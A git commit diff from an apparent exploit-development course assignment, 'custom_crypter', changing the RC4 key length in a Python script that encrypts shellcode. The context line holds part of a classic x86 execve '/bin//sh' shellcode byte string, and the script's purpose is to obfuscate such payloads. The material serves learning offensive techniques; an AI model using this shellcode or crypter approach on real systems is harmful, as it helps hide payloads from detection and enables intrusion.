44ad69557eb0a20e6427007e7890165bcd924b8f
aus-mate <seanfvt@gmail.com>
2020-09-02 23:16:47 +0100

    progress

--- assignment-7-custom_crypter/encrypter.py
+++ assignment-7-custom_crypter/encrypter.py
@@ -12,7 +12,7 @@ shellcode = bytes("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
 
 print ("\nOriginal: " + "".join("0x%02x," % i for i in shellcode))
 
-key = urandom(256)
+key = urandom(16)
 enc_cipher = ARC4.new(key)
 
 dec_cipher = ARC4.new(key)
